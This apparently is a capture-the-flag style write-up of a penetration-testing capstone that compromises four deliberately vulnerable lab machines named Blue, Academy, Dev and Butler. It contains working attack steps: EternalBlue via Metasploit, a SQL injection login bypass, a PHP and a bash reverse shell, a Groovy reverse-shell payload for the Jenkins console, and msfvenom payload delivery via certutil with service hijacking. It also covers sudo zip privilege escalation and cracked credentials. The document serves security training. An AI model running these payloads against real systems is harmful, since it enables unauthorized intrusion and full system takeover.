# Capstone

This consists of some intentionally vulnerable machines which would be exploited using our Kali Linux machine:

  1. [Blue](#blue)
  2. [Academy](#academy)
  3. [Dev](#dev)
  4. [Butler](#butler)

## Blue

---

* Given, the IP address of the vulnerable Windows Vista machine is 10.0.2.8. We can also confirm this once by using ```netdiscover```:

```shell
netdiscover -r 10.0.2.0/24
#shows 10.0.2.8 (Blue)

nmap -T4 -p 1-1000 -A 10.0.2.8
#using nmap to scan machine
#scanning only first 1000 ports as it would take much too time to scan all ports
```

* From the nmap scan, we get the following results:

```shell
135/tcp - open - msrpc - Microsoft Windows RPC
139/tcp - open - netbios-ssn - Microsoft Windows netbios-ssn
445/tcp - open - microsoft-ds - Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (WORKGROUP)
MAC Address - 08:00:27:2A:95:91
Running - Microsoft Windows 7|2008|8.1

Host script results:

smb2-security-mode - 2.1 - Message signing enabled but not required
nbstat - NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: unknown, NetBIOS MAC: 08:00:27:2a:95:91 (Oracle VirtualBox virtual NIC)
smb-security-mode - account_used: guest, authentication_level: user, challenge_response: supported, message_signing: disabled
OS - Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
OS CPE - cpe:/o:microsoft:windows_7::sp1
Computer name - WIN-845Q99OO4PP
NetBIOS computer name - WIN-845Q99OO4PP\x00
```

* Based on the results, we can attempt to enumerate based on the version of operating system, or if that does not work, we can go for the open ports and services given to us.

* Searching for exploits for the version of Microsoft Windows given to us, we get an exploit called 'Eternal Blue', which is a SMB remote code execution vulnerability.

* This exploit module is given as exploit/windows/smb/ms17_010_eternalblue, so we can run it using Metasploit framework:

```shell
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
#by default, payload is windows/x64/meterpreter/reverse_tcp

options

set RHOSTS 10.0.2.8

show targets

exploit
```

* Hence, the 'Eternal Blue' exploit worked and we got access to Blue.

## Academy

---

* After switching on the machine, we can start scanning from Kali Linux to discover the machine and do further operations:

```shell
netdiscover -r 10.0.2.0/24
#shows machine with address 10.0.2.15, IP of Academy

ping 10.0.2.15
#ping works as well, checking if machine is up

nmap -T4 -p- -A 10.0.2.15
#nmap to scan all ports
```

* From the nmap scan, we get the following results:

```shell
21/tcp - open - ftp - vsftpd 3.0.3
ftp-anon: Anonymous FTP login allowed (FTP code 230)
_-rw-r--r-- - 1 - 1000 - 1000 - 776 - May 30 2021 - note.txt
FTP server status - Connected to ::ffff:10.0.2.7 - Logged in as ftp - TYPE: ASCII
22/tcp - open - ssh - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
ssh-hostkey: 
  2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
  256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp - open - http - Apache httpd 2.4.38 (Debian)
http-title: Apache2 Debian Default Page: It works
http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:E7:E8:11 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* We can begin enumeration, starting with HTTP, and parallely enumerate other ports and services such as FTP:

  * We visit the link <http://10.0.2.15> for port 80/tcp. It gives us a generic Apache 2 Default Debian Page.

  * Information disclosure - Apache manual link given in <http://10.0.2.15> leads to 404 page with Apache version 2.4.38.

  * We can proceed to use a web application scanner here:

  ```shell
  nikto -h 10.0.2.15 #lists all vuln in website
  #Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
  #Uncommon header 'x-ob_mode' found, with contents: 1
  #Cookie goto and back created without the httponly flag
  #found /phypmyadmin/ChangeLog, /icons/README, /phpmyadmin/, /phpmyadmin/README

  dirbuster #tool for directory scanning, this lists more directories in website
  #the two major directories we get are /academy and /phpmyadmin
  ```

  * If we visit <http://10.0.2.15/academy>, we get a login portal. Attempting SQL injection by entering ```' or 1=1#```, we manage to log in as 'Rum Ham'.

  * Exploring the website further, we get more details about the user.

  * Information disclosure - In <http://10.0.2.15/academy/my-profile.php>, we get info; Student Name - Rum Ham; Student Reg No - 10201321; Pincode - 777777; CGPA - 7.60.

  * The Profile page also contains an option to upload a profile pic, so we can attempt to upload a PHP reverse shell here to see if it works.

  * Using any PHP reverse shell, such as the one given in <https://github.com/pentestmonkey/php-reverse-shell> we can proceed:

  ```shell
  vim academyshell.php #create file and open it
  #paste shell contents and edit the IP address of machine
  #save file and exit  

  nc -nvlp 1234 #netcat to listen at port 1234 (given in shell)

  #now we can upload the reverse shell in the website
  #this gives us access to the machine

  whoami
  #www-data
  ```

  * As we are not root here, we will have to use privilege escalation.

  * We can use a script called linPEAS on <https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS>, which checks vulnerabilities related to privilege escalation:

  ```shell
  #in a new terminal tab
  mkdir transfers #directory for separating files

  cd transfers/

  vim linpeas.sh #copy script content, save file

  #now we can start our web server here, so that we can get back to www-data on Academy and download this script
  python3 -m http.server 80 #hosts web server
  ```

  * Getting back to the Academy machine access through www-data:

  ```shell
  cd /tmp #get to tmp directory to download script

  wget http://10.0.2.7/linpeas.sh #downloads the script

  chmod +x linpeas.sh #give executable permissions

  ./linpeas.sh #executes the script, we can look through the output
  #/home/grimmie/backup.sh is highlighted in red/yellow, so it could be important
  #gives mysql_password = "My_V3ryS3cur3_P4ss"

  cat /etc/passwd
  #shows that the user "grimmie" is administrator
  #on trying user "grimmie" and password "My_V3ryS3cur3_P4ss" on phpmyadmin, it works and we get access

  cat /home/grimmie/backup.sh
  #shows a script which contains info about backup files; the script is executed at a certain period
  
  #we can also attempt to login into ssh, as it was mentioned that the same password was being used everywhere
  #so in a new tab

  ssh grimmie@10.0.2.15
  #we get access
  ```

* Enumerating FTP on port 21:

  * We use ftp to connect to Academy machine:

  ```shell
  ftp 10.0.2.15
  #use username Anonymous and password anon

  ls
  #shows note.txt

  get note.txt

  exit
  #exit ftp, back in our system now

  cat note.txt
  #gives details related to the website portal on <http://10.10.2.15/academy>, including login details
  ```

* Now, as we have access to the machine as 'grimmie', we can use one-liner reverse shells and save it in the script ```backup.sh```, so that when it is executed again we get root access:

  * We can use any one-liner reverse shells from Google:

  ```shell
  #in our Kali Linux terminal
  nc -nvlp 8081 #listening on port 8081 for reverse shell to work

  #in the Academy machine through 'grimmie'
  nano backup.sh
  #edit the script and remove all lines and paste the one-liner; make sure to edit IP address and port
  #bash -i >& /dev/tcp/10.0.2.7/8081 0>&1
  ```

  * This method works and we get access as root on Academy. We can view the flag.txt as well.

---

## Dev

---

* Scanning using netdiscover and nmap:

```shell
netdiscover -r 10.0.2.0/24
#gives IP of Dev as 10.0.2.9

nmap -T4 -p- -A 10.0.2.9
```

* nmap gives the following info:

```shell
22/tcp - open - ssh - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
ssh-hostkey: 
  2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
  256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)

80/tcp - open - http - Apache httpd 2.4.38 (Debian)
  http-server-header: Apache/2.4.38 (Debian)
  http-title: Bolt - Installation error

111/tcp - open - rpcbind - 2-4 (RPC #100000)

2049/tcp - open - nfs_acl - 3 (RPC #100227)

8080/tcp - open - http - Apache httpd 2.4.38 (Debian)
  http-open-proxy: Potentially OPEN proxy.
  Methods supported:CONNECTION
  http-server-header: Apache/2.4.38 (Debian)
  http-title: PHP 7.3.27-1~deb10u1 - phpinfo()

39265/tcp - open - nlockmgr - 1-4 (RPC #100021)
53457/tcp - open - mountd   - 1-3 (RPC #100005)
55407/tcp - open - mountd   - 1-3 (RPC #100005)
55989/tcp - open - mountd   - 1-3 (RPC #100005)

MAC Address: 08:00:27:B6:FC:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
```

* Enumerating HTTP at ports 80 and 8080:

  * Visiting the links <http://10.0.2.9:80> and <http://10.0.2.9:8080> gives us pages for Bolt installtion error and PHP default version webpage, respectively.

  * Information disclosure:

    * Apache 2.4.38 and PHP version 7.3.27-1~deb10u1 used in website

    * Bolt installation error page on <http://10.0.2.9:80> shows that current folder is /var/www/html/. Similarly, Apache run directory given as /var/run/apache2

    * PHP page shows system details - Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

    * HTTP Header request info - GET / HTTP/1.1

  * Scanning web app:

  ```shell
  ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:80/FUZZ
  #using ffuf for directory scanning

  ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.9:8080/FUZZ
  ```

  * Information disclosure:

    * Using ffuf, we get directories /public, /src, /app, /vendor, /extensions for <http://10.0.2.9:80>

    * Similarly, for <http://10.0.2.9:8080>, we get /dev and /server-status

  * We access the directories of <http://10.0.2.9:80>, and most of it were ordinary files, except for a few. A file named config.yml gives us credentials - username: bolt, password: I_love_java

  * Accessing <http://10.0.2.9:8080/dev> leads us to a website called Boltwire. We create an account on it and the URL changes to a format, such that it can have some vulnerabilities.

  * On Googling, it's found that Boltwire does have file related vulnerabilities. Using the file upload vulnerability given in <https://www.exploit-db.com/exploits/48411>, the URL can be modified to reveal the /etc/passwd file, which gives us a list of the users. One of the users is 'jeanpaul', who could be 'jp' from the todo.txt

* Enumerating nfs_acl at 2049:

  * We can use nfs_acl to mount files in our system from Dev:

  ```shell
  showmount -e 10.0.2.9 #shows export list - /srv/nfs

  mkdir /mnt/dev/ #folder to store files

  mount -t nfs 10.0.2.9:/srv/nfs /mnt/dev/

  cd /mnt/dev/

  ls #shows save.zip

  unzip save.zip #asks for password, we do not have it

  apt install fcrackzip #install tool to crack zip password

  fcrackzip -v -u -D -p /root/rockyou/rockyou.txt save.zip
  #-v for verbosity, -u for unzip, -D for dictionary attack and -p for passwords file
  #password is java101

  unzip save.zip #enter password to unzip

  ls #shows two files
  ```

  * The two files give us some info - todo.txt shows file with text, signed by 'jp'; and the second file is id_rsa, a key. It could be probably useful for ssh, but we do not know the username.

  * However, we can use earlier usernames 'jp' and 'jeanpaul', the id_rsa file and 'I_love_java' to attempt the SSH login.

* Enumerating ssh at 22:

  * Attempting ssh login:

  ```shell
  ssh -i id_rsa jp@10.0.2.9
  #does not work

  ssh -i id_rsa jeanpaul@10.0.2.9
  #works with 'I_love_java'
  #logs in as jeanpaul

  ls

  history #check prev commands for clues

  sudo -l #shows what we can run without sudo password
  #it shows we can run 'sudo zip'
  #Google shows a lot of privilege escalation methods using sudo zip
  #we can use <https://gtfobins.github.io/> as a resource for binaries, including those related to privilege escalation
  #we can abuse sudo zip for escalating privileges

  TF=$(mktemp -u)

  sudo zip $TF /etc/hosts -T -TT 'sh #'
  #opens a shell as sudo

  id
  #shows that we are root now

  cd /root

  ls

  cat flag.txt
  ```

* Therefore, we have gained root access on Dev and captured the flag.txt as well.

---

## Butler

---

* Recon:

```shell
netdiscover -r 10.0.2.0/24
#gives IP of Butler 10.0.2.80

nmap -T4 -p 1-10000 -A 10.0.2.80 #prevent slow scanning by defining range of ports
```

* Scan results:

```shell
135/tcp - open - msrpc - Microsoft Windows RPC
139/tcp - open - netbios-ssn - Microsoft Windows netbios-ssn
445/tcp -  open - microsoft-ds?
5040/tcp - open - unknown
7680/tcp - open - pando-pub?
8080/tcp - open - http - Jetty 9.4.41.v20210516
  http-server-header: Jetty(9.4.41.v20210516)
  http-robots.txt: 1 disallowed entry 
  http-title: Site does not have a title
MAC Address: 08:00:27:A3:E0:75 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909

Host script results:
  nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:a3:e0:75 (Oracle VirtualBox virtual NIC)
  smb2-time: 
    date: 2022-03-04T09:29:43
    start_date: N/A
  smb2-security-mode: 
    3.1.1: 
    Message signing enabled but not required
```

* Enumerating HTTP on 8080:

  * On visiting the link <http://10.0.2.80:8080>, we get a login page for Jenkins. The URL is now <http://10.0.2.80:8080/login?from=%2F> and it looks vulnerable.

  * SQL injection does not work in the login page. We can attempt modifying the URL.

  * Simultaneously, scanning website:

    ```shell
    nikto -h http://10.0.2.80:8080
    
    ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.80:8080/FUZZ
    ```

  * These methods do not give any desirable outputs. We can attempt brute force login using Burp Suite.

  * We can use Cluster Bomb attack in Burp Suite as we do not know username and password. Using common usernames and passwords, we begin the brute-force.

  * Brute-force is successful as we get jenkins:jenkins as credentials for login.

  * Information disclosure - Jetty(9.4.41.v20210516) and Jenkins 2.289.3 used.

  * On searching for Jenkins exploits, we get a lot of results with Groovy being used. Furthermore, there is a part in the Jenkins website which uses Groovy in a script console, so we can search for vulnerabilities related to RCE (Remote Code Execution).

  * Using Metasploit to attempt exploitation:

    ```shell
    msfconsole

    use exploit/multi/http/jenkins_script_console

    options

    set RHOSTS 10.0.2.80

    set RPORT 8484

    set TARGETURI /

    show targets

    set target 0

    options

    exploit

    #this did not work, so we will try another method
    ```

  * Exploiting through Jenkins script console:

    ```shell
    #in terminal
    nc -nvlp 6666

    #in the script console in Jenkins
    String host="10.0.2.7";
    int port=6666;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
    ```

  * This works and we are able to gain access into the Butler machine:

    ```shell
    #currently in C:\Program Files\Jenkins
    
    whoami #butler\butler
    #we have to use privilege escalation now, to get root access

    systeminfo #gives complete info
    #OS Name - Microsoft Windows 10 Enterprise Evaluation
    #OS Build - 10.0.19043 N/A Build 19043
    ```

  * Similar to linPEAS for Linux Privilege Escalation, we have winPEAS for Windows Privilege Escalation, so we can attempt that. So, download winPEASx64.exe and open terminal in new tab:

    ```shell
    cd transfers/ #the folder from where we will be transferring folders to Butler

    mv /root/Downloads/winPEASx64.exe /root/transfers/winpeas.exe

    ls #we have winpeas.exe in this folder now

    python3 -m http.server 80 #starting web server on port 80

    #in Windows machine, that is, the terminal where we can access Butler
    cd C:\Users

    dir

    cd butler #this folder will mostly have read/write access

    certutil.exe -urlcache -f http://10.0.2.7/winpeas.exe winpeas.exe #using a service to transfer file from Kali Linux to Butler

    dir #we have winpeas.exe now

    winpeas.exe #executes and gives us a huge list of vulnerabilities
    #we decide to choose the vulnerabilities which have detected 'No quotes and spaces' (in files such as 'Wise Care'), as those allow us to execute .exe files

    #in the Kali machine, pause the webserver and insert malware to be transferred
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.7 LPORT=7777 -f exe > Wise.exe
    #this generates a shell named Wise.exe

    python3 -m http.server 80 #restart web server

    #in a new tab, start listening on port 7777
    nc -nvlp 7777
    ```

    ```shell
    #in Butler
    cd C:\

    cd "Program Files (x86)"

    dir

    cd Wise #required directory

    dir #includes 'Wise Care 365'

    certutil.exe -urlcache -f http://10.0.2.7/Wise.exe Wise.exe
    #as the 'Wise Care 365' service is started by admin, we have to first stop it and then run Wise.exe

    sc stop WiseBootAssistant

    sc query WiseBootAssistant #stops the service

    sc start WiseBootAssistant #this gives us shell access

    whoami #we have root access
    ```

---
